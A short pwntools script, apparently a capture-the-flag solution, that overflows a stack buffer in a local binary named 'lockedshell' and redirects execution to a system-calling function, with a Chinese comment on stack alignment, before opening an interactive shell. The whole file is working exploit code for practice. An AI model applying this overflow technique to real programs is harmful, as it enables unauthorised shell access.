from pwn import *
context(os='linux',terminal=['tmux','sp','-h'],log_level='debug')
p = process('./lockedshell')

payload = b'a'*0x50+b'b'*0x8+p64(0x401176)#地址加一，为了跳过跳过 `push rbp` 使栈指针在调用 `system` 时 16 字节对齐。
p.sendlineafter(b".\n",payload)
p.interactive()
